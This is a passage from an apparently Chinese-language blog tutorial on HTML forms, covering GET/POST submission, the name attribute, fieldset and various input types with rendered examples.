class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miao.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miao.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>GET 适合少量数据的提交（浏览器和服务器对URL长度有限制），数据会以 urlencode 的形式出现在 URL 的参数中，适合非敏感信息。</p><p>POST 适合大量数据的提交，且更有安全性，数据在 body 中提交，不会出现在URL中，适合包含敏感信息（例如密码）等情况。</p><p>不过二者本质上没有明显的差别，其实是在标准制定上有所不同而已。</p><h4 id="Name-属性"><a href="#Name-属性" class="headerlink" title="Name 属性"></a>Name 属性</h4><p>如果要正确地被提交，<strong>每个输入字段必须设置一个 <code>name</code> 属性</strong>。</p><p>若不含<code>name</code>属性，则不会向服务器提交这一项内容。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mickey<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mouse<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action="#">    First name:<br>    <input type="text" value="Mickey">    <br>    Last name:<br>    <input type="text" name="lastname" value="Mouse">    <br><br>    <input type="submit" value="Submit"></form> <br><p>（这个提交不会有反应的啦</p><h4 id="form-元素的完整属性"><a href="#form-元素的完整属性" class="headerlink" title="form 元素的完整属性"></a>form 元素的完整属性</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>action_page.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">accept-charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token attr-name">ectype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>application/x-www-form-urlencoded<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>off<span class="token punctuation">"</span></span> <span class="token attr-name">novalidate</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- ...form elements（表单元素） ...  --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>accept-charset</td><td>规定在被提交表单中使用的字符集（默认：页面字符集）。</td></tr><tr><td>action</td><td>规定向何处提交表单的地址（URL）（提交页面）。</td></tr><tr><td>autocomplete</td><td>规定浏览器应该自动完成表单（默认：开启<code>on</code>）。</td></tr><tr><td>enctype</td><td>规定被提交数据的编码（默认：<code>url-encoded</code>）。</td></tr><tr><td>method</td><td>规定在提交表单时所用的 HTTP 方法（默认：GET）。</td></tr><tr><td>name</td><td>规定识别表单的名称（对于 DOM 使用：document.forms.name）。</td></tr><tr><td>novalidate</td><td>规定浏览器不验证表单。</td></tr><tr><td>target</td><td>规定 action 属性中地址的目标（默认：<code>_self</code>）。</td></tr></tbody></table><hr><h3 id="用-fieldset-组合表单数据"><a href="#用-fieldset-组合表单数据" class="headerlink" title="用 fieldset 组合表单数据"></a>用 fieldset 组合表单数据</h3><p><code>&lt;fieldset&gt;</code> 元素组合表单中的相关数据。</p><p><code>&lt;legend&gt;</code> 元素为 <code>&lt;fieldset&gt;</code> 元素定义标题。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fieldset</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>legend</span><span class="token punctuation">></span></span>Personal information:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>legend</span><span class="token punctuation">></span></span>        First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mickey<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mouse<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fieldset</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/fieldset.png" alt="fieldset"></p><hr><h2 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h2><p><strong>表单元素</strong>指的是不同类型的 <strong>input 元素</strong>、<strong>复选框</strong>、<strong>单选按钮</strong>、<strong>提交按钮</strong>等等。</p><h3 id="input-元素"><a href="#input-元素" class="headerlink" title="input 元素"></a>input 元素</h3><p>最重要的<strong>表单元素</strong>。它有很多不同的 <em>type</em> 属性，比如：</p><table><thead><tr><th>类型type</th><th>描述</th></tr></thead><tbody><tr><td>text</td><td>定义常规文本输入。</td></tr><tr><td>radio</td><td>定义单选按钮输入（选择多个选择之一）</td></tr><tr><td>submit</td><td>定义提交按钮（提交表单）</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><h4 id="文本输入text、密码输入password"><a href="#文本输入text、密码输入password" class="headerlink" title="文本输入text、密码输入password"></a>文本输入text、密码输入password</h4><p><code>&lt;input type="text"&gt;</code> 定义用于<strong>文本输入</strong>的单行输入字段。</p><p><code>&lt;input type="password"&gt;</code> 定义<strong>密码字段</strong>。</p><p><strong>表单本身并不可见。</strong>文本字段的<strong>默认宽度是 20 个字符</strong>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>    Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form>    Username:<br>    <input type="text" name="username">    <br>    Password:<br>    <input type="password" name="password"></form> <br><p>上面这个密码，password 字段中的字符会被做掩码处理（显示为星号或实心圆）。</p><br><h4 id="单选按钮输入-radio"><a href="#单选按钮输入-radio" class="headerlink" title="单选按钮输入 radio"></a>单选按钮输入 radio</h4><p><code>&lt;input type="radio"&gt;</code> 定义单选按钮。</p><p>单选按钮允许用户在有限数量的选项中选择其中之一。</p><p>注意：<strong>name属性要相同</strong>，否则可以点击不同选项。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>male<span class="token punctuation">"</span></span> <span class="token attr-name">checked</span><span class="token punctuation">></span></span>Male    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Female<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form>    <input type="radio" name="sex" value="male" checked="">Male    <br>    <input type="radio" name="sex" value="female">Female</form> <br><h4 id="复选框输入-checkbox"><a href="#复选框输入-checkbox" class="headerlink" title="复选框输入 checkbox"></a>复选框输入 checkbox</h4><p><code>&lt;input type="checkbox"&gt;</code> 定义复选框。</p><p>可以在有限数量的选项中选择零个或多个选项。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>animal<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cat<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>cat    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>animal<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dog<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>dog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form>    <input type="checkbox" name="animal" value="cat">cat    <br>    <input type="checkbox" name="animal" value="dog">dog</form> <br><p><em>（好像这个在博客里看不到效果i</em></p><h4 id="提交按钮-submit"><a href="#提交按钮-submit" class="headerlink" title="提交按钮 submit"></a>提交按钮 submit</h4><p><code>&lt;input type="submit"&gt;</code> 定义用于向表单处理程序<em>（form-handler）</em>提交表单的按钮。</p><p>表单处理程序通常是包含用来处理输入数据的脚本的服务器页面，就是前面说的<code>action</code>属性指定的。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mickey<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mouse<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action="#">    First name:<br>    <input type="text" name="firstname" value="Mickey">    <br>    Last name:<br>    <input type="text" name="lastname" value="Mouse">    <br><br>    <input type="submit" value="Submit"></form> <br><h4 id="按钮-button"><a href="#按钮-button" class="headerlink" title="按钮 button"></a>按钮 button</h4><p><code>&lt;input type="button"&gt;</code> 定义按钮。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert(<span class="token punctuation">'</span>Hello World!<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Click Me!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></code></pre><p><button type="button" onclick="alert('Hello World!')">Click Me!</button></p><br><p>通过<code>onclick</code>等属性来指定该按钮的功能。</p><hr><p>以下为HTML5中的新增的类型：</p><blockquote><p>color, date, datetime, datetime-local, email, month, number, range, search, tel, time, url, week</p></blockquote><h4 id="数字值的输入-number"><a href="#数字值的输入-number" class="headerlink" title="数字值的输入 number"></a>数字值的输入 number</h4><p><code>&lt;input type="number"&gt;</code> 用于应该包含数字值的输入字段。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Quantity (between 1 and 5):  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>quantity<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Quantity (between 1 and 5):  <input type="number" name="quantity" min="1" max="5"></form><br><p>可以对输入进行限制，比如以下属性。</p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>disabled</td><td>规定输入字段应该被禁用。</td></tr><tr><td>max</td><td>规定输入字段的最大值。</td></tr><tr><td>maxlength</td><td>规定输入字段的最大字符数。</td></tr><tr><td>min</td><td>规定输入字段的最小值。</td></tr><tr><td>pattern</td><td>规定通过其检查输入值的正则表达式。</td></tr><tr><td>readonly</td><td>规定输入字段为只读（无法修改）。</td></tr><tr><td>required</td><td>规定输入字段是必需的（必需填写）。</td></tr><tr><td>size</td><td>规定输入字段的宽度（以字符计）。</td></tr><tr><td>step</td><td>规定输入字段的合法数字间隔。</td></tr><tr><td>value</td><td>规定输入字段的默认值。</td></tr></tbody></table><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Quantity:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>points<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">step</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>30<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Quantity:  <input type="number" name="points" min="0" max="100" step="10" value="30"></form><br><p>有个坑，如果指定了<code>step</code>时，你指定的<code>max</code>属性的值不一定是可以取得到的呢。</p><p>比如min=1，max=100，step=10，则能取到的值为特定的1，11，21，…，91. 可以试一试。</p><form>  Quantity:  <input type="number" name="points" min="1" max="100" step="10"></form><br><h4 id="日期输入-date"><a href="#日期输入-date" class="headerlink" title="日期输入 date"></a>日期输入 date</h4><p>下面的几个都是日期选择器（Date Pickers）：</p><ul><li>date - 选取日、月、年</li><li>month - 选取月、年</li><li>week - 选取周和年</li><li>time - 选取时间（小时和分钟）</li><li>datetime - 选取时间、日、月、年（UTC 时间）</li><li>datetime-local - 选取时间、日、月、年（本地时间）</li></ul><br><p><code>&lt;input type="date"&gt;</code> 用于应该包含日期的输入字段。</p><p>点击后会弹出一个日期选择框，提交之后的值格式类似于 <code>day=2020-02-18</code>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  输入一个日期吧：  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>day<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form action="#">  输入一个日期吧：  <input type="date" name="day">  <input type="submit"></form><br><p>当然也可以<strong>添加限制</strong>啦。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Enter a date before 1990-01-01:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bday<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1989-12-31<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>  Enter a date after 2020-01-01:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bday<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2020-01-02<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Enter a date before 1990-01-01:  <input type="date" name="bday" max="1989-12-31"><br>  Enter a date after 2020-01-01:  <input type="date" name="bday" min="2020-01-02"><br></form><br><h4 id="月份输入-month"><a href="#月份输入-month" class="headerlink" title="月份输入 month"></a>月份输入 month</h4><p><code>&lt;input type="month"&gt;</code> 允许用户选择月份和年份。</p><p>这个在 Firefox 上不支持，Chrome 上是可以的。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Birthday (month and year):  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>month<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bdaymonth<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Birthday (month and year):  <input type="month" name="bdaymonth"></form><br><h4 id="周输入-week"><a href="#周输入-week" class="headerlink" title="周输入 week"></a>周输入 week</h4><p><code>&lt;input type="week"&gt;</code> 允许用户选择周和年。</p><p>在 Firefox 上好像也不支持。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Select a week:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>week<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>week_year<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Select a week:  <input type="week" name="week_year"></form><br><h4 id="无时区时间输入-time"><a href="#无时区时间输入-time" class="headerlink" title="无时区时间输入 time"></a>无时区时间输入 time</h4><p><code>&lt;input type="time"&gt;</code> 选择时间（无时区）。</p><p>Firefox 也不支持。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Select a time:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>time<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>usr_time<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Select a time:  <input type="time" name="usr_time"></form><br><h4 id="有时区时间输入-datetime"><a href="#有时区时间输入-datetime" class="headerlink" title="有时区时间输入 datetime"></a>有时区时间输入 datetime</h4><p><code>&lt;input type="datetime"&gt;</code> 选择时间（无时区）。</p><p>Chrome、Firefox 或 Internet Explorer 都不支持 type=”datetime”。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Birthday (date and time):  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>datetime<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bdaytime<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Birthday (date and time):  <input type="datetime" name="bdaytime"></form><br><h4 